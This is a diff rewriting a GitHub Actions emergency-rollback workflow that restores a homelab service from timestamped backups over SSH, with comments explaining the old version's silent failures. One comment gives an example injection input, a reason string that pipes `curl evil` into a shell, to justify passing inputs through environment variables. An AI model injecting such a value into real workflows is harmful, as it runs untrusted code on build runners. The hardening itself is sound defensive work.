@@ -1,483 +1,282 @@
 name: Emergency Rollback
 
+# Restores /opt/gitops on the production host from one of the timestamped
+# backups that deploy.yml leaves in /opt/gitops-backups.
+#
+# ─────────────────────────────────────────────────────────────────────────────
+# WHY THIS FILE WAS REWRITTEN WHOLESALE (ops #3282)
+#
+# The previous version described a deployment that does not exist. Measured on
+# gitopsdashboard.mgmt.lakehouse.wtf (192.168.1.136) on 2026-08-26, with
+# controls (/etc PRESENT, /nope-xyz-control absent — so the absences are real
+# and not an instrument that could not run):
+#
+#   /opt/homelab-gitops-auditor    absent   <- it cd'd here, lines 105/166/330
+#   /home/root/homelab-gitops-auditor absent <- and here, as the fallback
+#   pm2 on PATH                    no       <- it stopped/started pm2 processes
+#   docker / docker-compose        n/a      <- it ran docker-compose down
+#   a `current/` directory         n/a      <- it tarred current/
+#   a postgres db homelab_gitops   n/a      <- it ran pg_dump against it
+#   /opt/gitops                    PRESENT  <- the actual install dir
+#   gitops-audit-api.service       active   <- the actual service manager
+#
+# Two failure modes, and the second is worse than the first:
+#
+#  1. LOUD — every path and tool above is wrong, so the ssh block would error.
+#
+#  2. SILENT — every ssh step was guarded by `if: env.HAS_PRODUCTION_SSH ==
+#     'true'`, computed from `secrets.PRODUCTION_SSH_KEY` and
+#     `secrets.PRODUCTION_HOST`. Neither is a repo secret. `gh secret list`
+#     returns exactly five names — DEPLOY_SSH_KEY, EMAIL_PASSWORD,
+#     EMAIL_USERNAME, GH_REPO_PAT, GH_TOKEN_ADMIN_HOMELAB_GITOPS_AUDITOR —
+#     and the org has none. So the guard was false, every step that touches
+#     production was skipped, and the workflow reported SUCCESS having done
+#     nothing at all. An emergency rollback whose green run means "I did not
+#     run" is worse than one that fails.
+#
+#  3. UNREACHABLE — it also ran on `ubuntu-latest`. A GitHub-hosted runner
+#     cannot resolve or reach a .mgmt.lakehouse.wtf address, so even with the
+#     right secrets and paths it could never have connected. deploy.yml uses
+#     `runs-on: self-hosted` for exactly this reason.
+#
+# This file therefore mirrors deploy.yml's `deploy-homelab` job — same runner,
+# same secret, same SSH isolation, same install dir, same service — and
+# inverts it. Nothing here is conditional on a secret existing: if it cannot
+# do the job it fails.
+#
+# NOT COVERED, deliberately: staging. There is no staging host on record and
+# no STAGING_* secret exists, so a staging branch here could only ever be
+# decoration. deploy-staging.yml still carries the same wrong
+# `/opt/homelab-gitops-auditor` path at line 118 and is NOT touched by this
+# change — its host was never measured, and ops #3282 says do not assume it
+# is equally broken or equally fine.
+# ─────────────────────────────────────────────────────────────────────────────
+
 on:
   workflow_dispatch:
     inputs:
-      environment:
-        description: 'Environment to rollback'
-        required: true
-        default: 'production'
-        type: choice
-        options:
-        - production
-        - staging
       reason:
-        description: 'Reason for rollback'
+        description: 'Why are we rolling back? (recorded in the run log)'
         required: true
         type: string
-      rollback_to:
-        description: 'Version/commit to rollback to (leave empty for previous version)'
+      backup:
+        description: 'Backup dir name under /opt/gitops-backups, e.g. gitops-20260825_195128. Empty = most recent.'
         required: false
         type: string
 
-env:
-  REGISTRY: ghcr.io
-  IMAGE_NAME: ${{ github.repository }}
-  # secrets context is not allowed inside `if:` expressions, so precompute
-  # availability flags here.
-  HAS_PRODUCTION_SSH: ${{ secrets.PRODUCTION_SSH_KEY != '' && secrets.PRODUCTION_HOST != '' }}
-  HAS_STAGING_SSH: ${{ secrets.STAGING_SSH_KEY != '' && secrets.STAGING_HOST != '' }}
-  HAS_PRODUCTION_URL: ${{ secrets.PRODUCTION_URL != '' }}
-
 jobs:
-  validate-rollback:
-    name: Validate Rollback Request
-    runs-on: ubuntu-latest
-    outputs:
-      rollback_version: ${{ steps.determine-version.outputs.version }}
-      environment: ${{ github.event.inputs.environment }}
-      
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-      with:
-        fetch-depth: 0
-        
-    - name: Determine rollback version
-      id: determine-version
-      run: |
-        if [ -n "${{ github.event.inputs.rollback_to }}" ]; then
-          ROLLBACK_VERSION="${{ github.event.inputs.rollback_to }}"
-          echo "Using specified version: $ROLLBACK_VERSION"
-        else
-          # Get the previous successful deployment
-          ROLLBACK_VERSION=$(git log --oneline --format="%H" -n 10 | head -2 | tail -1)
-          echo "Using previous commit: $ROLLBACK_VERSION"
-        fi
-        
-        # Validate that the version exists
-        if git cat-file -e "$ROLLBACK_VERSION^{commit}"; then
-          echo "version=$ROLLBACK_VERSION" >> $GITHUB_OUTPUT
-          echo "✅ Rollback version validated: $ROLLBACK_VERSION"
-        else
-          echo "❌ Invalid rollback version: $ROLLBACK_VERSION"
-          exit 1
-        fi
-        
-    - name: Validate environment
-      run: |
-        ENV="${{ github.event.inputs.environment }}"
-        if [ "$ENV" != "production" ] && [ "$ENV" != "staging" ]; then
-          echo "❌ Invalid environment: $ENV"
-          exit 1
-        fi
-        echo "✅ Environment validated: $ENV"
-        
-    - name: Log rollback request
-      run: |
-        echo "🚨 ROLLBACK INITIATED"
-        echo "Environment: ${{ github.event.inputs.environment }}"
-        echo "Reason: ${{ github.event.inputs.reason }}"
-        echo "Rollback to: ${{ steps.determine-version.outputs.version }}"
-        echo "Initiated by: ${{ github.actor }}"
-        echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"
-
-  production-rollback:
-    name: Production Rollback
-    runs-on: ubuntu-latest
-    needs: validate-rollback
-    if: github.event.inputs.environment == 'production'
+  rollback:
+    name: Roll production back
+    # Must be self-hosted: the prod host is only reachable from inside the
+    # homelab network.
+    runs-on: self-hosted
     environment: production
-    
-    steps:
-    - name: Checkout rollback version
-      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-      with:
-        ref: ${{ needs.validate-rollback.outputs.rollback_version }}
-        
-    - name: Create emergency backup
-      if: env.HAS_PRODUCTION_SSH == 'true'
-      run: |
-        echo "${{ secrets.PRODUCTION_SSH_KEY }}" > prod_key
-        chmod 600 prod_key
-        
-        ssh -i prod_key -o StrictHostKeyChecking=no ${{ secrets.PRODUCTION_USER || 'deploy' }}@${{ secrets.PRODUCTION_HOST }} << 'EOF'
-          cd /opt/homelab-gitops-auditor || cd /home/$USER/homelab-gitops-auditor
-          
-          # Create emergency backup
-          EMERGENCY_BACKUP="emergency-backup-$(date +%Y%m%d-%H%M%S)"
-          
-          # Database backup
-          if command -v docker &> /dev/null && docker-compose ps db &> /dev/null; then
-            docker-compose exec -T db pg_dump -U homelab_user homelab_gitops > "$EMERGENCY_BACKUP.sql"
-          fi
-          
-          # Application backup
-          if [ -d "current" ]; then
-            tar -czf "$EMERGENCY_BACKUP.tar.gz" current/
-          fi
-          
-          echo "Emergency backup created: $EMERGENCY_BACKUP"
-        EOF
-        
-        rm -f prod_key
-        
-    - name: Setup Node.js
-      uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
-      with:
-        node-version: '20'
-        cache: 'npm'
-        
-    - name: Install dependencies
-      run: |
-        cd api && npm ci
-        cd ../dashboard && npm ci
-        
-    - name: Build rollback version
-      run: |
-        cd api
-        npm run build || echo "API build not available"
-        cd ../dashboard
-        npm run build
-        
-    - name: Log in to Container Registry
-      uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
-      with:
-        registry: ${{ env.REGISTRY }}
-        username: ${{ github.actor }}
-        password: ${{ secrets.GITHUB_TOKEN }}
-        
-    - name: Build and push rollback image
-      run: |
-        # Build rollback image
-        if [ -f "Dockerfile" ]; then
-          docker build -t ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:rollback-${{ needs.validate-rollback.outputs.rollback_version }} .
-          docker push ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:rollback-${{ needs.validate-rollback.outputs.rollback_version }}
-        fi
-        
-    - name: Execute production rollback
-      if: env.HAS_PRODUCTION_SSH == 'true'
-      run: |
-        echo "${{ secrets.PRODUCTION_SSH_KEY }}" > prod_key
-        chmod 600 prod_key
-        
-        ssh -i prod_key -o StrictHostKeyChecking=no ${{ secrets.PRODUCTION_USER || 'deploy' }}@${{ secrets.PRODUCTION_HOST }} << 'EOF'
-          set -e
-          cd /opt/homelab-gitops-auditor || cd /home/$USER/homelab-gitops-auditor
-          
-          echo "🚨 Starting production rollback..."
-          
-          if command -v docker &> /dev/null; then
-            echo "Performing Docker-based rollback..."
-            
-            # Stop current services
-            docker-compose down
-            
-            # Pull rollback image
-            docker pull ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:rollback-${{ needs.validate-rollback.outputs.rollback_version }} || echo "Rollback image not available, using local backup"
-            
-            # Check if we have a backup directory to rollback to
-            ROLLBACK_DIR=$(ls -td backup-* | head -1 2>/dev/null || echo "")
-            if [ -n "$ROLLBACK_DIR" ] && [ -d "$ROLLBACK_DIR" ]; then
-              echo "Rolling back to backup: $ROLLBACK_DIR"
-              
-              # Switch to backup directory
-              rm -f current
-              ln -sfn "$ROLLBACK_DIR" current
-              cd current
-              
-              # Start services with rollback version
-              docker-compose up -d
-            else
-              echo "No backup directory found, using image rollback"
-              # Update docker-compose to use rollback image
-              sed -i "s|image: .*|image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:rollback-${{ needs.validate-rollback.outputs.rollback_version }}|g" docker-compose.yml
-              docker-compose up -d
-            fi
-            
-            # Wait for services to start
-            sleep 30
-            
-            # Health check
-            if curl -f http://localhost/api/health; then
-              echo "✅ Rollback successful - health check passed"
-            else
-              echo "❌ Rollback health check failed"
-              exit 1
-            fi
-            
-          else
-            echo "Performing direct rollback..."
-            
-            # Find most recent backup
-            ROLLBACK_DIR=$(ls -td backup-* | head -1 2>/dev/null || echo "")
-            if [ -z "$ROLLBACK_DIR" ]; then
-              echo "❌ No backup directory found for rollback"
-              exit 1
-            fi
-            
-            echo "Rolling back to: $ROLLBACK_DIR"
-            
-            # Stop current processes
-            pkill -f "npm start" || true
-            
-            # Switch to backup
-            rm -f current
-            ln -sfn "$ROLLBACK_DIR" current
-            cd current
-            
-            # Start rollback version
-            cd api
-            if command -v pm2 &> /dev/null; then
-              pm2 stop homelab-gitops-auditor || true
-              pm2 start npm --name "homelab-gitops-auditor" -- start
-              pm2 save
-            else
-              npm start &
-              echo $! > ../homelab-gitops-auditor.pid
-            fi
-            
-            # Health check
-            sleep 15
-            if curl -f http://localhost:3001/api/health; then
-              echo "✅ Rollback successful - health check passed"
-            else
-              echo "❌ Rollback health check failed"
-              exit 1
-            fi
-          fi
-          
-          echo "🎉 Production rollback completed successfully"
-        EOF
-        
-        rm -f prod_key
-        
-    - name: Validate rollback
-      if: env.HAS_PRODUCTION_URL == 'true'
-      run: |
-        echo "Validating production rollback..."
-        
-        # Wait for rollback to stabilize
-        sleep 60
-        
-        # Health checks
-        for i in {1..5}; do
-          if curl -f "${{ secrets.PRODUCTION_URL }}/api/health"; then
-            echo "✅ Health check $i/5 passed"
-            break
-          else
-            echo "❌ Health check $i/5 failed"
-            if [ $i -eq 5 ]; then
-              echo "❌ Rollback validation failed after 5 attempts"
-              exit 1
-            fi
-            sleep 30
-          fi
-        done
-        
-        # Basic functionality test
-        curl -f "${{ secrets.PRODUCTION_URL }}" || echo "Frontend test failed"
-        curl -f "${{ secrets.PRODUCTION_URL }}/api/deployments/status" || echo "API functionality test failed"
-        
-    - name: Record rollback
-      if: env.HAS_PRODUCTION_URL == 'true'
-      run: |
-        # Record rollback in deployment history
-        curl -X POST "${{ secrets.PRODUCTION_URL }}/api/deployments/record" \
-          -H "Authorization: Bearer ${{ secrets.DEPLOYMENT_TOKEN }}" \
-          -H "Content-Type: application/json" \
-          -d '{
-            "version": "${{ needs.validate-rollback.outputs.rollback_version }}",
-            "environment": "production",
-            "status": "rollback",
-            "deployedBy": "${{ github.actor }}",
-            "deployedAt": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
-            "reason": "${{ github.event.inputs.reason }}",
-            "rollback": true
-          }' || echo "Rollback recording failed"
 
-  staging-rollback:
-    name: Staging Rollback
-    runs-on: ubuntu-latest
-    needs: validate-rollback
-    if: github.event.inputs.environment == 'staging'
-    environment: staging
-    
+    env:
+      PROD_HOST: gitopsdashboard.mgmt.lakehouse.wtf
+      PROD_USER: root
+      # ops #2638: `ssh -i` APPENDS to the identities ssh would already offer,
+      # so without IdentitiesOnly a call can succeed on a credential other than
+      # the one it names. Set once here so an added call site inherits the
+      # isolation rather than silently omitting it. The tilde is resolved by
+      # ssh itself, so it must not be quoted at the call sites.
+      SSH_OPTS: "-i ~/.ssh/deploy_key -o IdentitiesOnly=yes"
+
     steps:
-    - name: Checkout rollback version
-      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-      with:
-        ref: ${{ needs.validate-rollback.outputs.rollback_version }}
-        
-    - name: Setup Node.js
-      uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
-      with:
-        node-version: '20'
-        cache: 'npm'
-        
-    - name: Install dependencies and build
-      run: |
-        cd api && npm ci
-        cd ../dashboard && npm ci && npm run build
-        
-    - name: Execute staging rollback
-      if: env.HAS_STAGING_SSH == 'true'
-      run: |
-        echo "${{ secrets.STAGING_SSH_KEY }}" > staging_key
-        chmod 600 staging_key
-        
-        ssh -i staging_key -o StrictHostKeyChecking=no ${{ secrets.STAGING_USER || 'deploy' }}@${{ secrets.STAGING_HOST }} << 'EOF'
-          cd /opt/homelab-gitops-auditor || cd /home/$USER/homelab-gitops-auditor
-          
-          echo "🚨 Starting staging rollback..."
-          
-          # Find rollback target
-          ROLLBACK_DIR=$(ls -td staging-* backup-* | head -1 2>/dev/null || echo "")
-          if [ -z "$ROLLBACK_DIR" ]; then
-            echo "❌ No staging backup found"
+      - name: Log the rollback request
+        # `reason` and `backup` are attacker-controllable free text from
+        # workflow_dispatch. They reach the shell through env, never through
+        # ${{ }} interpolation into the script body — a reason of
+        # `"; curl evil | sh; #` would otherwise execute on the runner.
+        env:
+          REASON: ${{ inputs.reason }}
+          REQUESTED: ${{ inputs.backup }}
+        run: |
+          echo "🚨 EMERGENCY ROLLBACK"
+          echo "Reason:       $REASON"
+          echo "Backup:       ${REQUESTED:-(most recent)}"
+          echo "Initiated by: $GITHUB_ACTOR"
+          echo "Host:         $PROD_HOST"
+          echo "Timestamp:    $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+
+      - name: Configure SSH
+        env:
+          DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
+        run: |
+          set -euo pipefail
+          # Fail loudly rather than skipping. The old workflow's defining bug
+          # was a missing secret turning into a green no-op.
+          if [ -z "${DEPLOY_SSH_KEY:-}" ]; then
+            echo "::error::DEPLOY_SSH_KEY is empty. Refusing to report success for a rollback that cannot run."
             exit 1
           fi
-          
-          echo "Rolling back to: $ROLLBACK_DIR"
-          
-          # Stop current services
-          docker-compose -f docker-compose.staging.yml down || pkill -f "npm start" || true
-          
-          # Switch to rollback version
-          rm -f current
-          ln -sfn "$ROLLBACK_DIR" current
-          cd current
-          
-          # Start rollback version
-          if [ -f "docker-compose.staging.yml" ]; then
-            docker-compose -f docker-compose.staging.yml up -d
-            sleep 30
-            curl -f http://localhost:3072/api/health || exit 1
-          else
-            cd api && npm start &
-            sleep 15
-            curl -f http://localhost:3001/api/health || exit 1
-          fi
-          
-          echo "✅ Staging rollback completed"
-        EOF
-        
-        rm -f staging_key
+          mkdir -p ~/.ssh
+          chmod 700 ~/.ssh
+          printf '%s\n' "$DEPLOY_SSH_KEY" > ~/.ssh/deploy_key
+          chmod 600 ~/.ssh/deploy_key
+          ssh-keyscan -H "$PROD_HOST" >> ~/.ssh/known_hosts 2>/dev/null || true
 
-  post-rollback:
-    name: Post-Rollback Actions
-    runs-on: ubuntu-latest
-    needs: [validate-rollback, production-rollback, staging-rollback]
-    if: always() && (needs.production-rollback.result == 'success' || needs.staging-rollback.result == 'success')
-    
-    steps:
-    - name: Create rollback report
-      run: |
-        cat > ROLLBACK_REPORT.md << EOF
-        # Emergency Rollback Report
-        
-        ## Rollback Details
-        - **Environment:** ${{ github.event.inputs.environment }}
-        - **Reason:** ${{ github.event.inputs.reason }}
-        - **Rollback Version:** ${{ needs.validate-rollback.outputs.rollback_version }}
-        - **Initiated By:** ${{ github.actor }}
-        - **Timestamp:** $(date -u +"%Y-%m-%d %H:%M:%S UTC")
-        - **Status:** ${{ job.status }}
-        
-        ## Actions Taken
-        1. Emergency backup created
-        2. Services stopped gracefully
-        3. Rollback version deployed
-        4. Health checks validated
-        5. Deployment recorded in history
-        
-        ## Verification Steps
-        - [ ] API health check passed
-        - [ ] Frontend accessibility verified
-        - [ ] Database integrity confirmed
-        - [ ] Critical functionality tested
-        
-        ## Next Steps
-        1. Monitor system stability for 1 hour
-        2. Investigate root cause of issues
-        3. Plan forward fix or additional rollback
-        4. Update incident documentation
-        5. Review rollback procedures
-        
-        ## URLs
-        - Production: ${{ secrets.PRODUCTION_URL }}
-        - Staging: ${{ secrets.STAGING_URL }}
-        
-        ## Emergency Contacts
-        - Ops Team: [Contact Information]
-        - DevOps Lead: [Contact Information]
-        EOF
-        
-    - name: Upload rollback report
-      uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6.0.0
-      with:
-        name: rollback-report-${{ github.event.inputs.environment }}-${{ github.run_id }}
-        path: ROLLBACK_REPORT.md
-        retention-days: 365
-        
-    - name: Notify rollback completion
-      uses: 8398a7/action-slack@77eaa4f1c608a7d68b38af4e3f739dcd8cba273e # v3
-      with:
-        status: ${{ job.status }}
-        channel: '#incidents'
-        webhook_url: ${{ secrets.SLACK_WEBHOOK }}
-        message: |
-          🚨 EMERGENCY ROLLBACK COMPLETED
-          
-          Environment: ${{ github.event.inputs.environment }}
-          Reason: ${{ github.event.inputs.reason }}
-          Rollback Version: ${{ needs.validate-rollback.outputs.rollback_version }}
-          Status: ${{ job.status }}
-          Initiated by: ${{ github.actor }}
-          
-          Please verify system stability and investigate root cause.
-      env:
-        SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK }}
-        
-    - name: Create incident issue
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const issue = await github.rest.issues.create({
-            owner: context.repo.owner,
-            repo: context.repo.repo,
-            title: `🚨 Emergency Rollback: ${{ github.event.inputs.environment }}`,
-            body: `
-          ## Incident Details
-          - **Environment:** ${{ github.event.inputs.environment }}
-          - **Reason:** ${{ github.event.inputs.reason }}
-          - **Rollback Version:** ${{ needs.validate-rollback.outputs.rollback_version }}
-          - **Initiated By:** ${{ github.actor }}
-          - **Timestamp:** ${new Date().toISOString()}
-          
-          ## Status
-          Rollback has been executed. System should be stable on previous version.
-          
-          ## Actions Required
-          - [ ] Verify system stability
-          - [ ] Investigate root cause
-          - [ ] Plan forward fix
-          - [ ] Update incident documentation
-          - [ ] Post-mortem scheduling
-          
-          ## Links
-          - [Rollback Workflow Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})
-          - [Rollback Report](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts)
-          `,
-            labels: ['incident', 'rollback', '${{ github.event.inputs.environment }}']
-          });
-          
-          console.log(`Created incident issue #${issue.data.number}`);
-          
-          // Pin the issue
-          await github.rest.issues.update({
-            owner: context.repo.owner,
-            repo: context.repo.repo,
-            issue_number: issue.data.number,
-            state: 'open'
-          });
+      - name: Resolve the backup to restore
+        id: pick
+        env:
+          REQUESTED: ${{ inputs.backup }}
+        run: |
+          set -euo pipefail
+          # Validate BEFORE the value reaches a command line. The remote script
+          # rejects path separators too, but by then the local shell has
+          # already parsed the string — a name containing a single quote would
+          # break out of the quoting below. Allowlist the charset instead.
+          if [ -n "${REQUESTED:-}" ] &&
+             ! printf '%s' "$REQUESTED" | grep -qE '^[A-Za-z0-9._-]{1,64}$'; then
+            echo "::error::Refusing backup name '$REQUESTED': expected [A-Za-z0-9._-]{1,64}"
+            exit 1
+          fi
+          CHOSEN=$(ssh $SSH_OPTS -o StrictHostKeyChecking=accept-new \
+                     "$PROD_USER@$PROD_HOST" \
+                     "REQUESTED='${REQUESTED}' bash -s" <<'EOF'
+          set -euo pipefail
+          BACKUP_DIR=/opt/gitops-backups
+          [ -d "$BACKUP_DIR" ] || { echo "MISSING_BACKUP_DIR" >&2; exit 1; }
+          if [ -n "${REQUESTED:-}" ]; then
+            # Reject anything that is not a plain directory name: this string
+            # crosses into a path.
+            case "$REQUESTED" in
+              */*|*..*|"") echo "BAD_NAME" >&2; exit 1 ;;
+            esac
+            [ -d "$BACKUP_DIR/$REQUESTED" ] || { echo "NO_SUCH_BACKUP" >&2; exit 1; }
+            printf '%s\n' "$REQUESTED"
+          else
+            NEWEST=$(ls -1dt "$BACKUP_DIR"/gitops-* 2>/dev/null | head -1 || true)
+            [ -n "$NEWEST" ] || { echo "NO_BACKUPS" >&2; exit 1; }
+            basename "$NEWEST"
+          fi
+          EOF
+          )
+          echo "Selected backup: $CHOSEN"
+          echo "backup=$CHOSEN" >> "$GITHUB_OUTPUT"
+
+      - name: Restore
+        env:
+          BACKUP: ${{ steps.pick.outputs.backup }}
+        run: |
+          set -euo pipefail
+          ssh $SSH_OPTS -o StrictHostKeyChecking=accept-new \
+            "$PROD_USER@$PROD_HOST" "BACKUP='${BACKUP}' bash -s" <<'EOF'
+          set -euo pipefail
+
+          INSTALL_DIR=/opt/gitops
+          BACKUP_DIR=/opt/gitops-backups
+          RESTORE_SRC="$BACKUP_DIR/$BACKUP"
+          STAGING_DIR=/opt/gitops-rollback-new
+          OLD_DIR=/opt/gitops-rollback-old
+
+          [ -d "$RESTORE_SRC" ] || { echo "restore source vanished: $RESTORE_SRC"; exit 1; }
+
+          # Never leave a part-written staging tree occupying the disk if we
+          # abort. The swap itself is two renames on one filesystem, so it is
+          # atomic and cannot half-succeed; everything risky happens before it.
+          trap 'rm -rf "$STAGING_DIR"' EXIT
+
+          echo "==> Preflight: is there room?"
+          # Measured 2026-08-26 on this host: /opt/gitops is 368M, each backup
+          # 358M, and / is a 7.8G loop device at 72% with 2.1G free. This job
+          # writes TWO full copies (staging tree + pre-rollback snapshot)
+          # before it swaps, so it can plausibly exhaust the disk — and an
+          # emergency rollback that dies from ENOSPC is the worst possible
+          # time to find that out. Refuse up front instead.
+          NEED_KB=$(( $(du -sk "$RESTORE_SRC" | cut -f1) + $(du -sk "$INSTALL_DIR" | cut -f1) ))
+          FREE_KB=$(df -Pk "$BACKUP_DIR" | awk 'NR==2{print $4}')
+          MARGIN_KB=$(( NEED_KB / 10 ))          # 10% headroom
+          echo "need ${NEED_KB}K + ${MARGIN_KB}K margin, free ${FREE_KB}K"
+          if [ "$FREE_KB" -lt "$(( NEED_KB + MARGIN_KB ))" ]; then
+            echo "ABORT: not enough free space to roll back safely."
+            echo "Free space by pruning /opt/gitops-backups, then retry."
+            exit 1
+          fi
+
+          echo "==> Staging a copy of $RESTORE_SRC"
+          rm -rf "$STAGING_DIR"
+          cp -a "$RESTORE_SRC" "$STAGING_DIR"
+
+          echo "==> Carrying live runtime state FORWARD across the rollback"
+          # Same list deploy.yml preserves. A rollback reverts CODE; it must not
+          # revert accumulated data to whatever the backup happened to hold.
+          for rel in audit-history api/data wiki-agent.db logs; do
+            src="$INSTALL_DIR/$rel"
+            dst="$STAGING_DIR/$rel"
+            if [ -e "$src" ]; then
+              mkdir -p "$(dirname "$dst")"
+              rm -rf "$dst"
+              cp -a "$src" "$dst"
+              echo "preserved: $rel"
+            fi
+          done
+
+          echo "==> Emergency backup of the CURRENT (bad) tree, so this is reversible"
+          mkdir -p "$BACKUP_DIR"
+          EMERGENCY="$BACKUP_DIR/pre-rollback-$(date +%Y%m%d_%H%M%S)"
+          cp -a "$INSTALL_DIR" "$EMERGENCY"
+          echo "Pre-rollback snapshot: $EMERGENCY"
+
+          echo "==> Stopping gitops-audit-api"
+          systemctl stop gitops-audit-api
+
+          echo "==> Atomic swap"
+          rm -rf "$OLD_DIR"
+          mv "$INSTALL_DIR" "$OLD_DIR"
+          mv "$STAGING_DIR" "$INSTALL_DIR"
+
+          echo "==> Starting gitops-audit-api"
+          systemctl start gitops-audit-api
+
+          rm -rf "$OLD_DIR"
+
+          # Two INDEPENDENT prunes, each over its own glob. Pruning the two
+          # families together would be a latent bug: sorted by mtime the fresh
+          # pre-rollback snapshot is newest and survives by luck, so a widened
+          # glob looks correct on the first rollback and silently eats the
+          # older undo points on the third. Keeping the globs separate makes
+          # the guarantee structural rather than incidental.
+          #
+          # Retain 5 deploy backups (matches deploy.yml).
+          ls -1dt "$BACKUP_DIR"/gitops-* 2>/dev/null | tail -n +6 | xargs -r rm -rf
+          # Retain 2 undo points. At 368M each on a 7.8G disk this cannot be
+          # unbounded -- three un-pruned rollbacks would fill the volume.
+          ls -1dt "$BACKUP_DIR"/pre-rollback-* 2>/dev/null | tail -n +3 | xargs -r rm -rf
+
+          trap - EXIT
+          echo "==> Restore complete"
+          df -Pk "$BACKUP_DIR" | awk 'NR==2{printf "free after: %dM\n", $4/1024}'
+          EOF
+
+      - name: Verify the rolled-back service actually serves
+        run: |
+          set -euo pipefail
+          for i in $(seq 1 12); do
+            if curl -fsSL --max-time 5 "http://$PROD_HOST:3070/api/v2/platform/health" > /dev/null; then
+              echo "OK: /api/v2/platform/health responded on attempt $i"
+              curl -s -o /dev/null -w "/audit: HTTP %{http_code}\n" --max-time 5 \
+                "http://$PROD_HOST:3070/audit" || true
+              exit 0
+            fi
+            sleep 3
+          done
+          echo "::error::Health check did not pass within 36s AFTER the rollback. Production may be down."
+          ssh $SSH_OPTS -o StrictHostKeyChecking=accept-new "$PROD_USER@$PROD_HOST" \
+            'systemctl status gitops-audit-api --no-pager || true; journalctl -u gitops-audit-api -n 40 --no-pager || true'
+          exit 1
+
+      - name: Report
+        if: always()
+        env:
+          REASON: ${{ inputs.reason }}
+          CHOSEN: ${{ steps.pick.outputs.backup }}
+          STATUS: ${{ job.status }}
+        run: |
+          echo "Rollback of $PROD_HOST to '${CHOSEN:-<none selected>}': $STATUS"
+          echo "Reason given: $REASON"
+          echo "To undo, re-run with the pre-rollback-* snapshot named above."
+
+      - name: Remove deploy key
+        if: always()
+        run: rm -f ~/.ssh/deploy_key
